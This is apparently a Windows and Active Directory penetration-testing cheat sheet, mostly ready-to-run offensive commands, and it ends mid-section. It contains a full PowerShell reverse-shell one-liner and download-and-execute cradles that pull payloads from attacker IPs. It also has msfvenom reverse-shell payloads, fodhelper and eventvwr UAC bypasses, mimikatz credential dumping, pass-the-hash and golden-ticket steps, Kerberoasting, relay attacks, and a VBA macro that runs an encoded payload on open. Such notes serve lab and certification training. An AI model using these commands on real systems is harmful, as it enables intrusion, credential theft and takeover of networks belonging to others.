# Strings.exe
```
C:\Tools\strings64.exe -accepteula file.exe
```

# Alternate Data Stream (ADS)
Alternate Data Streams (ADS) is a file attribute specific to Windows NTFS (New Technology File System). Every file has at least one data stream ($DATA) and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn't display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files.

```
Get-Item -Path file.exe -Stream *

wmic process call create $(Resolve-Path file.exe:streamname)
```
# Powershell
## User Management
* add user
```
net user <username> <password> /add /domain
```
* add user to group
```
net group <group> <username> /add
```
## Transfer Files
```
IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.13:8000/file", "C:\Users\user\Desktop\file")
Copy-Item \\10.10.14.13\share\file C:\Users\user\Desktop\file
```
## Reverse shell with local authentication
* assuming you already found credentials (for example by running powerup)
```powershell
$pass = ConvertTo-SecureString 'Password!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('Administrator', $pass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.13:8000/rev.ps1')" -Credential $cred
```

## Misc Commands
**Get-ChildItem**
* ```-Path``` Specifies a path to one or more locations. Wildcards are accepted.
* ```-File``` / -Directory To get a list of files, use the File parameter. To get a list of directories, use the Directory parameter. You can use the Recurse parameter with File and/or Directory parameters.
* ```-Filter``` Specifies a filter to qualify the Path parameter.
* ```-Recurse``` Gets the items in the specified locations and in all child items of the locations.
* ```-Hidden``` To get only hidden items, use the Hidden parameter.
* ```-ErrorAction``` SilentlyContinue Specifies what action to take if the command encounters an error.
```
Get-ChildItem -Hidden
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
```

**Get-Content**
```
Get-Content -Path file.txt
Get-Content file.txt | Select -first 10
Get-Content file.txt | Select-String 'searchstring'
Get-Content -Path file.txt | Measure-Object -Word
(Get-Content -Path file.txt)[index]
```

**Select-String**
```
Select-String -Path 'c:\users\administrator\desktop' -Pattern '*.pdf'
Select-String -Path file.txt -Pattern 'searchstring'
```

**Get-FileHash**
```
Get-FileHash -Algorithm MD5 file.txt
```

**Encode Base64**
```
$FileName = "C:\Users\Phineas\Desktop\Oracle issue.txt"
$data = Get-Content $Filename
$data_utf8 = [System.Text.Encoding]::UTF8.GetBytes($data)
[System.Convert]::ToBase64String($data_utf8)
```

# Reverse Shells
Download and execute with Powershell:
```
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))"

c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')
```

Powershell only:
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# Privilege Escalation
## Switch to high integrity level
```
powershell.exe Start-Process cmd.exe -Verb runAs
```

**Checklist:**
* [Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

**Process Monitoring:**
* [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)

## System Enumeration
```
systeminfo
hostname
tasklist
wmic qfe
wmic qfe get Caption, Description, HotFixID, InstalledOn
wmic logicaldisk get caption,description,providername
mountvol
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"} #get kernel modules and device drivers
driverquery /v # get drivers installed on system

# list services
wmic service get name,displayname,pathname,startmode
# look for services that were automatically started and not path c:\windows
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# get permissions on directory
icalcs "C:\Path"
```
Discover domain controller hostname
```
nslookup
set type=all
_ldap._tcp.dc._msdcs.sandbox.local
exit
```


## User Enumeration
```
whoami
whoami /priv
whoami /groups
net user 
net user /domain
net user Administrator
net user jim /domain
net group /domain
net localgroup
net localgroup Administrators
```

## Restart host
```
shutdown /r /t 0
```

## Start/Stop Service
First list with
```
wmic service get name,displayname,pathname,startmode
```
Then start/stop
```
net start ServiceName
net stop ServiceName
```

## Scheduled Tasks
```
schtasks /query /fo LIST /v
```

## Applications
Only shows application installed by windows installer
```
wmic product get name,version,vendor
```

## Network Enumeration
```
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
```

## Password Hunting
```
findstr /si password *.txt *.ini *.config
```

## AV and FW Enumeration
```
sc query windefend
sc queryex type= service # Show all services
netsh advfirewall firewall dump
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
firewall show state
netsh firewall show config
```

## Update Windows Firewall
**SYSTEM privilege required**

Update Windows Firewall since incoming requests are most likely blocked
```
netsh advfirewall firewall add rule name="foward_port_rule" protocol=TCP dir=in localip=10.10.10.10 localport=4444 action=allow
```
Port Forward
```
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=10.10.10.10 connectport=445 connectaddress=192.168.1.10
```
Example: List SMB shares (from attacker machine, victim=10.10.10.10, hostToConnect=192.168.1.10)
```
smbclient -L 10.10.10.10 --port=4444
# mount share
sudo mount -t cifs -o port=4444 //10.10.10.10/Share -o username=Administrator,password=passwd! /mnt/share
```



## AutoElevate Binaries (SUID like)
First, on Windows systems, we should check the status of the AlwaysInstallElevated48 registry setting. If this key is enabled (set to 1) in either HKEY_CURRENT_USER or HKEY_LOCAL_MACHINE, any user can run Windows Installer packages with elevated privileges.

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

## UAC Bypass
Check integrity level with ``whoami /groups`` or ``whoami /all``

Using Powershell (GUI access needed for prompt)
```
powershell.exe Start-Process cmd.exe -Verb runAs
```

The following example uses C:\windows\system32\fodhelper.exe which is launched every time a user opens 'Manage optional features'
1. Use [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) and sigcheck.exe to verify integrity level
```
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe /accepteula
```
2. Look for 'requestedExecutionLevel'(requireAdministrator) and 'autoElevate'(true)
3. Launch [Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
4. Filter by process name
5. Filter by Operation contains Reg
6. Filter for Result = "NAME NOT FOUND" to get registry hives that are accessed but not exist
7. Look for a registry hive that you have read and write access, e.g. HKEY_CURRENT_USER => Path contains HKCU
8. Find out what the application attempts to query
9. Look for other access to entries that contain same query (or part of it), if the process can successfully acces that key in some other hive, the results will provide us with more clues
10. Create according registry, e.g. ``REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command``
11. Find out what value fodhelper.exe attempts to query (DelegateExecute)
12. Add a DelegateExecute entry, leaving its value empty. If the application discovers this empty value it will hopefully follow the MSDN specification for application protocols and look for a program to launch
```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
```
13. Replace "NAME NOT FOUND" filter with "SUCCESS"
14. Verify fodhelper.exe finds the new DelegateExecute entry
15. Replace the empty value with an executable (cmd.exe)
```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```

**Example Eventvwr.exe**
* see https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/

Create reverse shell .exe file
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.134 LPORT=444 -f exe -o foobar.exe
```
Modify Registry
```
REG ADD HKCU\Software\Classes\mscfile\shell\open\command /d "C:\Users\Public\Videos\foobar.exe" /f
```
Set up listener and run eventvwr.exe



## Automated Enumeration Tools
Download and run executable with simple bypass method (from cmd.exe)
```
echo IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.14.23:8000/jaws-enum.ps1") | powershell -noprofile -
```
Download File
```
IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.23:8000/nc.exe", "C:\test\nc.exe")
```

**Executables:**
* [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
* [winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [Seatbelt.exe](https://github.com/GhostPack/Seatbelt)
* [Wason.exe](https://github.com/rasta-mouse/Watson)
* [SharpUp.exe](https://github.com/GhostPack/SharpUp)

**PowerShell Scripts:**
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) 
* [Sherlock.ps1](https://github.com/rasta-mouse/Sherlock)
```
powershell -ep bypass
Import-Module .\Sherlock.ps1
Find-AllVulns
```
* [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [jaws-enum.ps1](https://github.com/411Hall/JAWS)

**Other Resources:**
* [exploit suggester (metasploit)](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
* [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
* [windows-exploit-suggester.py (local)](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
this script uses python2 which can lead to issues. create virtualenv and make sure you are using xlrd version 1.2.0
```
virtualenv -p /usr/bin/python2.7 venv
source venv/bin/activate
pip install xlrd==1.2.0
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2020-12-12-mssb.xls --systeminfo sysinfo.txt
```
* [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

## Potato Attacks
Check if SeImpersonatePrivilege authentication is enabled with ``whoami /priv``
* [Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
* [Juicy Potato](https://github.com/ohpe/juicy-potato)
```
C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Public\exe.exe -l 5837
```
# Active Directory

## Capturing NTLM Net-Hashes with Responder

:information_source: Default configuration in windows is always fall back to LLMNR if DNS resolving fails. LLMNR broadcasts its request to the whole network.

```sequence
Victim->DNS Server: Who is "fileservrr"
DNS Server->Victim: I don't know
Victim->Network: Anyone knows who "fileservrr" is?
Attacker->Victim: Yes, this is me
Victim->Attacker: I would like to log in
Attacker->Victim: OK, encrypt this challenge with your password hash
Victim->Attacker: Sends encrypted challenge
Attacker->Victim: Sorry, something went wrong
```

``` bash
responder -I eth0 -rdwv

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 192.168.92.129
[SMB] NTLMv2-SSP Username : WHITEROSE\ealderson
[SMB] NTLMv2-SSP Hash     : ealderson::WHITEROSE:af77856ba3332f51:B81BF48A67FE909F054D588DF1345C6A:0101000000000000C0653150DE09D2012BC03559A3DFA755000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000F279BA7D9D36AB76937A31505A3A023E63ECAF17A4F311B0E248705A3CB09B9A0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390032002E003100330033000000000000000000
```

## Crack NTLMv2 Net-Hashes with hashcat

1. Get module number of NTLM hash with 

   ``` bash
   hashcat --example-hashes | grep NTLM -C 4
   ```

2. Crack Hash

   ``` bash
   hashcat -m 5600 hashes.txt rockyou.txt 
   ```

## SMB Relay Attack

:warning: This does not work if SMB Signing is required. 

:warning: The relayed user needs to be a local administrator on target machine to dump the SAM hashes.

Disable SMB in ```/etc/responder/Responder.conf``` and run:

``` bash
responder -I eth0 -rdwv
```

Open a second terminal and run:

```
ntlmrelayx.py -tf targets.txt -smb2support
```

## LDAP Enumeration
```bash
# get base domain name with nmap
nmap -n -sV --script "ldap* and not brute" 10.10.10.161
nmap -p 389 --script ldap-rootdse -Pn 10.10.10.161
nmap -p 389 --script ldap-search -Pn 10.10.10.161

# get information
ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local"  
```

## Password Spraying
* get the domain password policy first to check lockout policy
```bash
crackmapexec smb 10.10.10.161 --pass-pol
crackmapexec smb 10.10.10.161 -u userlist.txt -p pwlist.txt
crackmapexec smb 10.10.10.0/24 -u userlist.txt -p pwlist.txt
crackmapexec smb 10.10.10.0/24 -u userlist.txt -p pwlist.txt --continue-on-success
```
* cracking considering lockout policy, see [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)

## Shell Access with Credentials

:information_source: Start with smbexec.py and wmiexec.py due to psexec.py is more noisy and may trigger windows defender.
:information_source: If winrm port is open, see [evil-winrm](https://github.com/Hackplayers/evil-winrm)

``` bash
psexec.py whiterose.local/ealderson:Password!@192.168.92.129
impacket-psexec whiterose.local/ealderson:Password!@192.168.92.129
```

* https://github.com/Hackplayers/evil-winrm

* PowerShell
```
$dcsess = New-PSSession -Computer DCHOSTNAME
Invoke-Command -Session $dcsess -ScripBlock {ipconfig}
Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
```

## Shell Access with Kerberos Ticket
Create a TGT Kerberos ticket first by issuing a command that requires domain permissions (net use \\dc01)
```
.\PsExec.exe \\dc01 cmd.exe
```

## IPv6 Attacks

:information_source: ​Only possible if IPv6 is enabled and no DNS Server is defined for IPv6. In this case we may get NTLM net-Hashes and can relay those to authenticate (see SMB Relay Attack). Details: 

[Combining NTLM Relaying and Kerberos Delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

[mitm6 - compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)

:information_source: Make sure mitm6 is installed. If not, install it with: ``` sudo pip3 install mitm6 ```

``` bash
mitm6 -d whiterose.local
```

Open a second terminal and run:

```
ntlmrelayx.py -6 -t ldaps://192.168.92.130 -wh fakewpad.whiterose.local -l outfile
```

:information_source: ``` --delegate-access ``` 


## Collect all Users with their Attributes
For more information about samAccountTypes see this [link](https://docs.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype?redirectedfrom=MSDN)
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
} 

```
## Resolving Nested Groups
Print names of all the groups
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(objectClass=Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.name
}

```
Assuming we found group XY. Replace the last 8 lines with:
```
$Searcher.filter="(name=XY)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.member
}
```
For finding domain joined services
```
.
..
$Searcher.filter="serviceprincipalname=*http*"
..
.
```

## PowerView

:information_source: [sourcecode](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

:information_source: [cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

1. Bypass execution policy

```
powershell -ep bypass
```

2. Use PowerView

```
. .\PowerView.ps1
Import-Module .\PowerView.ps1
```

3. Start enumerating. Examples:

```
Get-NetDomain
Get-NetDomainControllers
Get-DomainPolicy
{Get-DomainPolicy}."system access"
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select samaccountname
Get-UserProperty
Get-UserProperty -Properties pwdlastset
Get-NetComputer -FullData
Get-NetGroup
Get-NetGroupMember -GroupName "Domain Admin"
Invoke-ShareFinder
Get-NetGPO | select displayname, whenchanged
```

:information_source: Detect possible honey accounts with:

```
Get-UserProperty -Properties logoncount
```

Currently logged on Users
```
Get-NetLoggedon -ComputerName clientXY
Get-NetSession -ComputerName DC01
```

Get the domain's account policy. Specially helpful for bruteforce attacks => see lockout policy
```
net accounts
```
or using crackmapexec
```
crackmapexec <IP> -u 'user' -p 'password' --pass-pol
```

## Bloodhound

:information_source: [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1) 				

:information_source: [Data-Collector](https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collector) 

On host run:

```
powershell -ep bypass
. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain WHITEROSE.local -ZipFileName file.zip 
```

You can also use the .exe
```
.\SharpHound.exe -c all
```

Transfer the zip file to kali instance and load it into bloodhound to visualize.

:information_source: Install bloodhound using apt or download git repository
:information_source: bloodhound depends on neo4j so make sure it is installed
:information_source: good starting point are prebuild queries. see 'shortest path to high value targets'

Start NEO4j (user: neo4j)
```
sudo neo4j console
```
Start Bloodhound
```
bloodhound
```
Then import zip file

## Pass The Password

:information_source: install crackmapexec using apt
:information_source: keep lockout policy in mind

You can spray credentials in an AD network using crackmapexec:

```
crackmapexec smb 192.168.92.0/24 -u ealderson -d WHITEROSE.local -p Password123
```

## Dumping Hashes with secretsdump.py

:information_source: secretsdump.py is part of the impacket toolkit

```
secretsdump.py whiterose/ealderson:Password123@192.168.92.131
```

## Dumping SAM file 
```
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM system
impacket-secretsdump -sam sam -system system LOCAL
```

## Pass The Hash
If you retreive the NTLM hash simply paste it as lmhash and nthash:
ntlm: 8c802621d2e36fc074345dded890f3e5 => 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5

Use NTHASH (LMHASH:NTHASH)

```
crackmapexec 192.168.92.0/24 -u "Elliot Alderson" -H 64f12cdda88057e06a81b54e73b949b --local
```

Alternative: [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
```
pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.10.10.22 cmd
```
Or 
```
psexec.py domain.local/Administrator@192.168.10.10 -hashes 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5
```
```
psexec.py -u "Elliot Alderson":@192.168.92.131 -hashes <lmhash:nthash>
psexec.py domain.local/Administrator@192.168.10.10 -hashes 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5
```
Or
```
# Overpass the hash
mimikatz # sekurlsa::pth /user:user /domain:domain.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
PS C:\> net use \\dc01
PS C:\> .\psexec.exe \\dc01 cmd.exe
```

## Pass The Ticket (Silver Ticket)
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required. (TGS offers more flexibility than TGT)

Example SID:
```
  S-1-5-21-2536614405-3629634762-1218571035-1116
  \_______________________________________/\___/
  S-<Revision Level>-<Identifier-Authority>-<Relative Identifier>
```
Use mimikatz to create a silver ticket.
To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.
```
mimikatz # kerberos::purge
mimikatz # kerberos::list
mimikatz # kerberos::golden /user:user /domain:domain.com /sid:s-1-5-21-1602875587-2787523311-2599479668 /target:ServicePrincipalName /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```
where /rc4 is the hash

## Lateral Movement with Distributed Component Object Model (DCOM) 
i: Requires access to TCP 135 for DCOM and TCP 445 for SMB. Relatively new vector. May avoid some detection system like EDR/NDR/AV.

The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.

Discover available methods from a DCOM object. In this example Excel.
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$com | Get-Member
```
This script revealed the 'Run' method which allows to execute Visual Basic for Applications (VBA) remotely
POC macro:
```
Sub mymacro()
    Shell ("notepad.exe")
End Sub
```
Save to an Excel file and copy to target
```
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```
The Excel application is instantiated through DCOM with SYSTEM account. This account does not have a profile, which is used as part of the opening process.
To fix this, simply create the Desktop folder at ``C:\Windows\SysWOW64\config\systemprofile``
```
$Path = "\\10.10.10.10\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)
```
Call the 'Run' method on our Excel file
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "10.10.10.10"))

$LocalPath = "C:\Users\dummy_admin.corp\myexcel.xls"

$RemotePath = "\\10.10.10.10\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\10.10.10.10\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
```


## Token Impersonation

Get a meterpreter session (e.g. smb/psexec).

```
meterpreter> load incognito
meterpreter> list tokens
meterpreter> impersonate_token marvel\\administrator
```

## Kerberoasting
Enumerate SPN's and request a service ticket. Decrypting ticket by brute forcing provides the password hash which can be cracked to retreive the password in clear text.

:information_source: GetUserSPNs.py is part of the impacket toolkit

**Kerberos in a nutshell:**
```sequence
User->Domain Controller: 1. Request TGT, Provide NTLM hash
Domain Controller->User: 2. Receive TGT enc. w. krbtgt hash
User->Domain Controller: 3. Request TGS for Server (Presents TGT)
Domain Controller->User: 4. Receive TGS enc. w. servers account hash
User->Application Server: 5. Presents TGS for service enc. w. servers account
Application Server->Domain Controller: (opt.) PAC Validation request
Domain Controller->Application Server: (opt.) PAC Validation response
```

**Get Kerberos Service Ticket by SPN:**
When requesting the service ticket from the domain controller, no checks are performed on whether the user has any permissions to access the service hosted by the service principal name. These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. Then, since it is our own ticket, we can extract it from local memory and save it to disk.


Powershell script:
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```
List tickets with powershell:
```
klist
```
Or with mimikatz:
```
kerberos::list
kerberos::list /export
```

Or simply with Invoke-Kerberoast.ps1
```
Import Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hash.hash
```

**Cracking Service Ticket:**
Since the service ticket is encrypted with the service accounts password hash, we can bruteforce this with a wordlist
This is also possible with john the ripper or hashcat (which is a lot faster)
```
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticket.kirbi 
```

If ticket is obtained with mimikatz ``kerberos::list /export``
```
kirbi2john ticket.kirbi > ticket.txt
john --wordlist=rockyou.txt ticket.txt

```

If Invoke-Kerberoast.ps1 used:
```
hashcat -m 13100 --force hash.hash /usr/share/wordlists/rockyou.txt
```

**Crack the servers account hash:**

```
GetUserSPNs.py whiterose.local/ealderson:Password123 -dc-ip 192.168.92.130 -request
```

## cPassword / Group Policy Preferences (GPP) Attacks

:information_source: GPP's allowed admins to create policies using embedded credentials. These credentials were encrypted and placed in a 'cPassword'. The key was accidentally released. Patched with MS14-025 but does not prevent the previous uses. If the policy was set before this was patched. [Blogpost](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

:information_source: Check if vulnerable with metasploit using smb_enum_gpp.

:information_source: You can test this attack using the retired machine 'Active' on HackTheBox

Get Groups.xml from SYSVOL or \Replication share and check for cPassword.

```
gpp-decrypt <cPassword-Hash>
```

## Mimikatz

[Github Page](https://github.com/gentilkiwi/mimikatz)

:information_source: Tool used to view and steal credentials, generate kerberos tickets, leverage attacks and dump credentials stored in memory. Not working every time due to cat and mouse game between developers and windows.

**Dump Hashes:**

Run mimikatz on DC and run the following commands to dump hashes.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam 
mimikatz # lsadump::sam /patch
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::dcsync /user:Administrator # domain admin privilege needed, triggers domain controller synchronization (NTDS.dit)
```

In case you do not have a proper shell try:
```
.\mimikatz "sekurlsa::logonpasswords" exit
```

## Golden Ticket Attack
When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt. By getting the krbtgt password hash one is able to create custom TGTs (golden tickets)

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt 
# look for NTLM hash for User krbtgt
```

Copy S-ID of the domain and NTLM hash of TGT-Account.

```
mimikatz # kerberos::golden /User:Administrator /domain:whiterose.local /sid:S-1-5-21-301242389-3840584950-2384549833 /krbtgt:64f12cdda88057e06a81b54e73b949b /id:500 /ptt
mimikatz # misc::cmd # to launch new command prompt

> psexec.exe \\dc01 cmd.exe
```
:information_source: Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication. If we were to connect using PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked. Therefore the following would not work!
```
> psexec.exe \\10.10.10.100 cmd.exe
```

# Client Side Attacks
## HTML Applications
If a file is created with the extension of .hta instead of .html, Internet Explorer will automatically interpret it as a HTML Application and offer the ability to execute it using the mshta.exe program

POC: 
```
<html>
<body>

<script>

  var c= 'powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC...d7Ks'; 
  new ActiveXObject('WScript.Shell').Run(c);
  
</script>

</body>
</html>
```
Craft payload
```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o payload.hta
```

## Exploiting Microsoft Office
Create payload:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta
```
Since VBA has a 255-character limit for literal strings we need to split the command we want to execute into multiple lines
```
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```
VBA macro:
```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
    ...
    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
    Str = Str + "QA="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

# Port Redirection and Tunneling
## Plink
* [plink](http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
```
plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.1:3306 10.10.10.10
# avoid prompt 'Store key in cache?'
cmd.exe /c echo y | plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.0:3306 10.10.10.10
```

## netsh
```
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=10.10.10.10 connectport=445 connectaddress=192.168.1.10
```
## HTTPTunneling Through Deep Packet Inspection
* [HTTPTunnel](http://http-tunnel.sourceforge.net/)

Assuming the following setup:

Attacker Machine (Kali): 10.10.10.10
Compromised Machine: 10.10.10.20, additional interface to 192.168.1.0/24
Windows Server: 192.168.1.100
Firewall incoming traffic to ports 80,443 and 4444 (misconfigured)
Objective: Get a RDP Session to the Windows Server

1. Setup local forward on compromised machine
```
